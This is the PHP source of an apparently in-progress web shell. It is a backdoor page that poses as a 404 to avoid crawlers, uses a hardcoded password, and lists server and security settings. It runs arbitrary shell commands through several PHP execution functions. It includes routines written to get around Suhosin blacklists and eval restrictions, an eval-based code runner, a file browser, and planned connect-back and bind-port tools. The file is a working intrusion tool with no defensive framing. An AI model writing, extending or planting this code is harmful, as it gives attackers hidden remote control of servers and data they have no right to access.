<?php

header("HTTP/1.1 404 Not Found\r\n");    // stop crawlers
//session_start();                       // not needed on this server
//error_reporting(E_ERROR);              // leave it commented for code warnings
$start_time = microtime(true);           // Start execution Timer

/* Required info */
$server_info = array(
               'Password'           => 'nevermore',
               'PHP OS'             => PHP_OS,
               'Address'            => getenv('SERVER_ADDR'),
               'HTTP host'          => gethostbyname(getenv('HTTP_HOST')),
               'Name'               => getenv('SERVER_NAME'),
               'Software'           => getenv('SERVER_SOFTWARE'),
               'PHP uname'          => php_uname(),
               'Username'           => get_current_user(),
               'CWD'                => getcwd(),
               'Filename'           => basename(__FILE__),
               'cURL'               => ini_enabled(extension_loaded('curl')),
               'PCNTL'              => ini_enabled(extension_loaded('pcntl')),
               'Safe mode'          => ini_enabled('safe_mode'),
               'Suhosin patch'      => ini_enabled(constant('SUHOSIN_PATCH')),
               'Suhosin extension'  => ini_enabled(extension_loaded('suhosin')),
               'Suhosin blacklist'  => ini_enabled('suhosin.executor.func.blacklist'),
               'Suhosin eval'       => ini_enabled('suhosin.executor.disable_eval'),
               'Disabled functions' => ini_enabled('disabled_functions'));

/* Shell pages */
$pages = array('terminal' => '',
               'files'    => '',
               'tools'    => '',
               'config'   => '',
               'remove'   => '');

/* Terminal methods */
$basic_methods = array('system', 'passthru', 'exec', 'shell_exec', 'wscript_exec');
$fork_methods  = array('popen', 'proc_open');

/* Handle user authentication TODO: get 404 code/quit */
if(!$_SESSION['auth'] && ($_GET['pwd'] != $server_info['Password']))
{
    // Get 404 code
    //die();
}

/* Initialize session */
$_SESSION['auth']         = true;
$_SESSION['method']       = 'system';
$_SESSION['default_page'] = key($pages);
$_SESSION['dir']          = $server_info['CWD'];


/* Global functions */
// More appropriately formatted version of ini_get().
function ini_enabled($var)
{
    $vstr = (gettype($var) === 'string');
    $var  = $vstr ? ini_get($var) : $var;
    
    return ($var ? (($vstr && $var !== '1') ? $var : 'Yes') : 'No');    
}


// Suhosin-friendly version of is_callable().
function func_callable($func)
{
    global $server_info;
    
    if($server_info['Suhosin extension'] === 'No' || empty($server_info['Suhosin blacklist']))
        return is_callable($func);
    
    $blacklist = explode(',', $server_info['Suhosin blacklist']);
    $blacklist = array_map('trim', $blacklist);
    
    return (!in_array($func, $blacklist) && is_callable($func));
}


// Removes array[i] from array if !condition(array[i]).
function sort_array(&$array, $condition)
{   
    for($i = 0, $count = count($array); $i < $count; $i++)
        if(!$condition($array[$i])) unset($array[$i]);
    
    $array = array_values($array);
    return count($array);
}


// Write output of func(arg) to a buffer; obtain full output.
function buffer_wr(&$buffer, $func, $arg)
{
    ob_start();
    
    echo func_callable($func) ? $func($arg) : exec_func($func, $arg);
    $buffer = ob_get_contents();
    
    ob_end_clean();
}


// Format filesize listing for files().
function str_filesize($file)
{
    $units = array('B', 'KB', 'MB', 'GB');
    $size  = filesize($file);
    $count = count($units);
    
    for($i = 0; $i < $count && $size >= 1024; $i++, $size /= 1024);
    return round($size, 1) . " $units[$i]";
}


// Callback functions to bypass !func_callable() (Suhosin-blacklisted) functions.
function exec_func($func, $arg)
{
    $arg           = is_array($arg) ? $arg : array($arg);
    $multi_methods = array('array_map', 'array_walk', 'array_filter', 'call_user_func_array');
    $methods       = array('array_map', 'array_walk', 'array_filter', 'call_user_func', 'call_user_func_array',
                     'register_shutdown_function', 'register_tick_function', 'ReflectionFunction');
    
    $methods = (count($arg) > 1) ? $multi_methods : $methods;
    sort_array($methods, 'func_callable');
    
    switch($methods[0])
    {
        case 'array_map':                        array_map($func, $arg);                       break;
        case 'array_walk':                       array_walk($arg, $func);                      break;
        case 'array_filter':                     array_filter($arg, $func);                    break;
        case 'call_user_func':                   call_user_func($func, $arg[0]);               break;
        case 'call_user_func_array':             call_user_func_array($func, $arg);            break;
        case 'register_shutdown_function':       register_shutdown_function($func, $arg[0]);   break;
        
        case 'register_tick_function':
            declare(ticks = 1);
            
            register_tick_function($func, $arg[0]);
            unregister_tick_function($func);
        break;
        
        case 'ReflectionFunction':
            $callback = new ReflectionFunction($func);
            $callback->invoke($arg[0]);
        break;
    }
}

// Command execution.
function terminal()
{
    global $server_info, $basic_methods, $fork_methods;
    
    $methods = $_POST['fork'] ? $fork_methods : $basic_methods;
    $command = $_POST['fork'] ? str_replace('"', '\"', $_POST['cmd']) : "{$_POST['cmd']} 2>&1";
    
    $shell   = (strtoupper(substr($server_info['PHP OS']), 0, 3) !== 'WIN') ? '/bin/bash -c' : 'cmd /C';
    $output  = sort_array($methods, 'is_callable') ? '' : 'All command execution methods are unavailable.';

    if($methods) switch($methods[0])
    {
        case 'system':       buffer_wr($output, 'system',     $command);            break;
        case 'passthru':     buffer_wr($output, 'passthru',   $command);            break;
        case 'shell_exec':   buffer_wr($output, 'shell_exec', $command);            break;
        case 'exec':         buffer_wr($output, 'exec',       "echo `$command`");   break;
        
        case 'popen':
            $memsize = memory_get_usage();
            $handle  = popen("$shell \"$command\" 2>&1", 'r');
            
            while (!feof($handle))
                $output .= fread($handle, (memory_get_usage() - $memsize));
            
            pclose($handle);
        break;
        
        case 'proc_open':
            $descriptorspec = array(
                    1 => array('pipe', 'w'),
                    2 => array('pipe', 'w')
                );
            
            $handle = proc_open("$shell \"$command\"", $descriptorspec, $pipes);
            
            if(is_resource($handle))
            {
                $stdout = stream_get_contents($pipes[1]);
                $stderr = stream_get_contents($pipes[2]);
                
                $output = $stdout ? $stdout : $stderr;
                
                // Possible deadlock if pipes aren't closed before proc_close().
                fclose($pipes[1]);
                fclose($pipes[2]);
            }
            
            proc_close($handle);
        break;
        
        case 'wscript_exec':
            $shell  = new COM('WScript.Shell');
            $output = $shell->Exec("cmd /C $command")->StdOut->ReadAll;
        break;
        
        /*
        case 'pcntl_exec':
            pcntl_exec('/bin/bash', array('-c', $command));        Replaces php with bash - try pcntl_fork() or something.
        break;
        */
    }

    //$output = is_array($output) ? implode(PHP_EOL, $output) : $output;
    $prev_cmd  = htmlentities($_POST['cmd']);
    $fork_span = 'Attempt to fork the process by utilizing either popen() or proc_open().';

    echo <<<TERM
<div id="terminal">
<form method="POST" action="">
Command: <input type="text" name="cmd" value="$prev_cmd" /> <input type="submit" value="Execute" /> <label><input type="checkbox" name="fork" /> Fork<a href="#" class="tooltip">[?]<span>$fork_span</span></a></label>
</form>
<textarea rows=20 cols=90 readonly>$output</textarea>
</div>
TERM;
}


// PHP code evaluator with suhosin.executor.disable_eval bypass.
function eval_code()
{
    global $server_info;

    $code     = $_POST['code'];
    $func     = $_POST['func'];
    $args     = explode(',', $_POST['args']);
    
    $anonymous = function ($func, $args) { $func($args); };
    $methods   = array('create_function', 'call_user_func', 'call_user_func_array');   // Reminder: add $anonymous (keeps dying).
    $output    = sort_array($methods, 'func_callable') ? '' : 'All code execution methods are unavailable.';
    
    
    if($methods && $methods[0] !== 'create_function')
    {
        $output   = "// Functionality is limited to function calls; using {$methods[0]}().";
        $crippled = true;
    }

    if($server_info['Suhosin eval'] === 'No')
    {
        // buffer_wr() won't work (without a wrapper); variable functions don't work with language constructs.
        function eval_wrapper($code) { eval($code); }
        buffer_wr($output, 'eval_wrapper', $code);
    }
    elseif($methods) switch($methods[0])
    {
        case 'create_function':        buffer_wr($output, 'create_function',      array(null,  $code));   break;
        case $anonymous:               buffer_wr($output, $anonymous,             array($func, $args));   break;
        case 'call_user_func':         buffer_wr($output, 'call_user_func',       array($func, $args));   break;
        case 'call_user_func_array':   buffer_wr($output, 'call_user_func_array', array($func, $args));   break;
    }
    
    
    /* if($crippled)
        input for $func and $args; */
    
    
    echo <<<EVAL
<div id="eval">
<form method="POST" action="">
<textarea rows=20 cols=90 name="code">$output</textarea>
<input type="submit" value="Execute" />
</form>
</div>
EVAL;
}

// TODO: filebrowser function 
function files()
{
    //global $server_info; (Unsure why this was included. Think! Think! THIIINK! No brainblast.)
    
    $files  = scandir($_SESSION['dir']);
    
    $output = <<<FILES
<div class="files">
<table>
<tr>
<th>Filename</th>
<th>Filesize</th>
<th>Permission</th>
</tr>
FILES;

    foreach($files as $file)
    {
        $size = is_dir($file) ? 'Dir' : str_filesize($file);

        $output .= '<tr>';
        $output .= "<td>$file</td>";
        $output .= "<td>$size</td>";
        $output .= '</tr>';
    }

    $output .= <<<FILES
</table>
</div>
FILES;

    echo $output;
}


// TODO: tools function
function tools()
{
    // Connect-back
    // Bind-port
    // MySQL query exec
    // eval() + alternatives
    
    
    echo <<<TOOLS
<div id="tools">
<table>
<tr>
<th>Tools</th>
</tr>
<tr>
<td><a href="?page=eval_code">PHP code evaluator</a></td>    <!-- Modify later - dynamically loop through tools -->
</tr>
</table>
</div>
TOOLS;
}


/* TODO: config */
function config()
{
}


function remove()
{
    /*if(unlink(__FILE__))
        echo '<script>window.location = window.location</script>';*/
        // this isn't how it works (dont uncomment it because it'll delete the file)
}

// End core PHP
?>

<!-- Begin shell design -->
<html>

<head>
    <title>We need an original title.</title>

    <style type="text/css">
        body
        {
            background-color: #000;
            color:            #FFF;
        }

        a
        {
            color: #4C83AF;
        }

        input[type="text"]
        {
            background-color: #101010;
            color:            #4C83AF;
            width:            400px;
            border:           solid 1px #333;
        }

        input[type="submit"]
        {
            background-color: #101010;
            color:            #4C83AF;
            border:           solid 1px #333; 
        }

        input[type="checkbox"]
        {
            background-color: #101010;
            margin:           0px 0px 2px 2px;
            vertical-align:   middle;
            border-radius:    8px;
        }

        textarea
        {
            background-color: #101010;
            color:            #4C83AF;
            border:           solid 1px #333;
        }
        
        textarea:hover, #terminal textarea:focus, input:hover, input:focus
        {
            border: solid 1px #555;
        }

        label
        {
            color:         #4C83AF;
            border-left:   solid 2px #333;
            border-right:  solid 2px #333;
            border-radius: 8px;
            padding:       2px;
        }

        
        table
        {
            border:          1px solid #333;
            border-collapse: collapse;
            text-align:      center;
        }
        
        th
        {
            font-size:        13px;
            font-style:          bold;
            background-color: #101010;
            color:            #4C83AF;
        }
        
        th, td
        {
            padding: 0px 0px 0px 0px;
            border:    1px solid #333;
        }

        #container
        {
            background-color: #111;
            border:           solid 1px #4C83AF;
            border-radius:    8px;
            margin:           auto;
        }

        #info b
        {
            color:   #4C83AF;
            padding: 0px 0px 0px 8px;
        }

        #nav
        {
            background-color: #212121;
            border-top:       solid 1px #FFF;
            border-bottom:    solid 1px #FFF;
            padding-bottom:   15px;
            text-align:       center;
        }

        #nav li
        {
            list-style-type: none;
            display:         inline;
            border-top:      solid 1px #FFF;
            border-bottom:   solid 1px #FFF;
            border-radius:   4px;
            padding:         1px;
            margin:          0px 10px 0px 10px;
        }

        #nav a
        {
            text-decoration: none;
            font-style:      italic;
        }

        #nav li:hover
        {
            background-color: #191919;
            padding:          2px;
        }
        
        #terminal, #eval
        {
            text-align: center;
        }
                
        #footer
        {
            background-color:           #212121;
            border-top:                 solid 1px #FFF;
            border-bottom:              solid 1px #FFF;
            border-bottom-left-radius:  8px;
            border-bottom-right-radius: 8px;
        }

        .tooltip
        {
            cursor:          help;
            text-decoration: none;
            position:        relative;
            font-size:       11px;
            color:           #FFF;
            margin-left:     3px;
        }

        .tooltip:hover
        {
            color: #FFF;
        }

        .tooltip span
        {
            visibility:                hidden;
            position:                  absolute;
            white-space:               pre-wrap;
            width:                     250px;
            left:                      -130px;
            bottom:                    27px;
            background-color:          #000;
            color:                     #FFF;
            opacity:                   0.7;
            font-size:                 9px;
            border:                    1px solid #555;
            border-radius:             6px;
            padding:                   7px;
        }

        .tooltip:hover span
        {
            visibility: visible;
        }
      

        <?php
            // page specific css (works) this is the lewdest css i've ever seen (reporting you for lewd) - n-san :'c
            echo $pages[$_GET['page']];
        ?>
    </style>

<!-- will add it later -->

</head>

<body>
<div id="container">

<div id="info">
<pre><?php foreach($server_info as $name => $val) echo "<b>$name:</b> $val\n"; ?></pre>
</div>

<pre>

<div id="nav">
<?php foreach(array_keys($pages) as $name) echo "<li><a href='?page=$name'>" . ucfirst($name) . '</a></li>'; ?>
</div>

<?php $_GET['page'] ? $_GET['page']() : $_SESSION['default_page'](); ?>

</pre>

<div id="footer">
<?php
$end_time = microtime(true);
$exectime = round($end_time - $start_time, 4);
echo "<center>Page executed in $exectime seconds.</center>\n";
?>
</div>

</div>
</body>

</html>
